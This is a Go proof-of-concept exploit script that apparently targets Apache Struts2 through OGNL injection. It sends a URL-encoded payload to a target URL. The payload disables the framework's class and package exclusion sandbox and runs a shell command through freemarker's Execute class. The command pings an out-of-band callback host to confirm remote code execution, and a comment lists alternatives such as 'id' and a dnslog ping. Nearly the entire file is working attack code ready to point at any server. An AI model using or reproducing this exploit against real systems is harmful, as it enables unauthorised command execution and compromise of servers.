/*
@File   : rcednslog.go
@Author : pan
@Time   : 2023-06-26 14:37:42
*/
package main

import (
	"fmt"
	"io"
	"net/http"
)

func PocScript(Url string, dnslog string) {
	payload := "/?id=%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.to" +
		"mcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%2" +
		"7)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%2" +
		"3potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23" +
		"emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27e" +
		"xcludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23Unic" +
		"odeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27ping%20-c%201%20cif6p4h3dn54tm1qc5g0bcg7og786zays.oast.live%27%7d).(%23res%3d%23exec.exec" +
		"(%23cmd))%7d"
		// cmd:
		// id
		// ping%20-c%201%20234.rl235i.dnslog.cn
		//
	vulUrl := Url + payload
	headers := map[string][]string{}
	headers["User-Agent"] = []string{"Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"}
	headers["Accept"] = []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"}
	headers["Accept-Language"] = []string{"en-US,en;q=0.5"}
	headers["Accept-Encoding"] = []string{"gzip, deflate"}
	headers["Connection"] = []string{"close"}
	headers["Upgrade-Insecure-Requests"] = []string{"1"}
	headers["Cache-Control"] = []string{"max-age=0"}
	req, err := http.NewRequest("GET", vulUrl, nil)
	if err != nil {
		fmt.Printf("http NewRequest err:%v", err)
	}
	req.Header = headers
	client := http.Client{}
	resp, _ := client.Do(req)
	body, _ := io.ReadAll(resp.Body)
	fmt.Println(string(body))
}

func main() {
	PocScript("http://ip:port", "")
}
